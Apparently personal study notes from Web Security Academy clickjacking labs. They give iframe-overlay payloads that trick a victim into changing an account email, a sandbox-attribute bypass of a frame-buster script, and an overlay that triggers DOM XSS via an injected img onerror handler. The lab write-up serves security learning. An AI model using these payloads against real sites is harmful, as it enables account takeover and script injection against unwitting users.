# Clickjacking

## Clickjacking with form input data from a URL parameter
- Overlay an iframe with a URL to the change email resource, with an email in there as the query parameter. Position the "Click Me" button 
```
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 465px;
        left: 90px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a0f00cb04fe73b982b56b6e00fe0054.web-security-academy.net/my-account?email=evil@hacker1.net"> </iframe>
```
- Clickjacking with a frame buster script
    - [Stanford framebusting article](https://seclab.stanford.edu/websec/framebusting/)

The web page uses this javascript code to detect if it is embedded in an iframe, and replace the contents of the body if it is:
```
if (top != self) {
    window.addEventListener("DOMContentLoaded", function() {
        document.body.innerHTML = 'This page cannot be framed';
    }, false);
}
```
We can exploit the iframe sandbox attribute to bypass this by assigning it to the "allow-forms" directive. [w3schools iframe sandbox](https://www.w3schools.com/tags/att_iframe_sandbox.asp)
```
<iframe src="https://0a2f00850357cb87b9c1f11a00e70021.web-security-academy.net/my-account?email=evil@hacker.net" sandbox="allow-forms">
</iframe>
```

## Exploiting clickjacking vulnerability to trigger DOM-based XSS
  - Exploiting the sink in which the feedback form renders the name input without sanitization to inject an img tag which calls onprint. The URL has the hash #feedbackResult to position the screen futher down for the clickjacking overlay.
```
<style>
iframe {
    width: 1500px;
    height: 800px;
    position: abosolute;
    opacity: 0.1;
    z-index: 2;
}
div {
    position: relative;
    top: 740px;
    left: 130px;
    z-index: 1;
}
</style>
<div>Click here</div>
<iframe src="https://0ae60084045a3d9482a951c200d2005a.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=foo%40bar.com&subject=foo&message=foo#feedbackResult"></iframe>
```